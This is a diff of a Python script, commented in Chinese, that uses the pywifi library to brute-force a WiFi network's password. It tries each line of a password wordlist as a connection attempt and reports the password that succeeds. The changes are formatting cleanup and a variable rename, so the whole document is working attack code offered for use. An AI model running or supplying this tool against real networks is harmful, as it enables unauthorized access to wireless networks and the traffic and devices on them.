@@ -1,11 +1,12 @@
 # 本脚本既不是pin码破解，也不是抓包破解，而是直接连接wifi暴力匹配密码本中的密码---贼慢
 import pywifi
 # attain the const warehouse of access status
-from pywifi import const 
+from pywifi import const
 import time
 
+
 # 测试连接,返回连接结果
-def wifiConnect(ifaces,pwd):
+def wifiConnect(ifaces, pwd):
     # 断开上一次尝试连接时建立的网卡连接
     ifaces.disconnect()
     time.sleep(0.1)
@@ -39,15 +40,16 @@ def wifiConnect(ifaces,pwd):
         else:
             return False
     else:
-        print("已有wifi连接:!",const.IFACE_DISCONNECTED)
-    
+        print("已有wifi连接:!", const.IFACE_DISCONNECTED)
+
+
 # 读取密码本
 def readPassword():
     print("开始破解：")
     # 密码本路径,,来自https://github.com/xwayway/wifi-connector
-    path ="wifi_password.txt"
+    path = "wifi_password.txt"
     # 打开文件reading in text mode
-    f = open(path,"r")
+    f = open(path, "r")
     i = 0
     while True:
         i += 1
@@ -55,14 +57,14 @@ def readPassword():
             # 一行一行读取
             password = f.readline()
             password = password[:-1]  # 去除一行末的换行符
-            bool = wifiConnect(ifaces,password)
+            bool = wifiConnect(interfaces, password)
             if bool:
-                print("密码已破解：",password)
+                print("密码已破解：", password)
                 print("wifi已连接！")
-                ifaces.network_profiles()  # 你连接上wifi的时候可以用这个试试，会返回你连接的wifi的信息
+                interfaces.network_profiles()  # 你连接上wifi的时候可以用这个试试，会返回你连接的wifi的信息
                 break
             else:
-                print("第",i,"密码破解中，密码校对：",password)
+                print("第", i, "密码破解中，密码校对：", password)
             if not password:
                 print('文件已读取完，退出。')
                 f.close()
@@ -71,15 +73,13 @@ def readPassword():
             # continue
             print("error")
 
+
 if __name__ == '__main__':
-# 抓取网卡接口
+    # 抓取网卡接口
     wifi = pywifi.PyWiFi()
     # 获取第一个无线网卡
-    ifaces = wifi.interfaces()[0]
-    print(ifaces)
+    interfaces = wifi.interfaces()[0]
+    print(interfaces)
     # 获取电脑无线网卡的名称
-    print(ifaces.name())
+    print(interfaces.name())
     readPassword()
-
-
-
